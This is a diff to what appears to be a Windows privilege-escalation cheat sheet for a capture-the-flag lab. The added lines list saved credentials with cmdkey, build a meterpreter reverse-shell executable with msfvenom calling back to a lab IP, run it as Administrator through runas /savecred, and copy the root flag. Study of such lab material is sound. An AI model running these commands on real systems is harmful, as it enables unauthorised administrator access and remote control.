@@ -17,7 +17,17 @@ winexe -U 'admin%password' //MACHINE_IP cmd.exe
 # Saved Creds
 List any saved credentials:
 ```
+# List saved credentials:
 cmdkey /list
+
+# create a reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4747 -f exe -o oscpp.exe
+
+# run the reverse
+runas /savecred /user:Access\\Administrator C:\\PrivEsc\\oscpp.exe
+
+# copy flag as logged in user
+runas /user:Access\\Administrator /savecred "cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\security\\Desktop\\flag.txt"
 ```
 Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
 
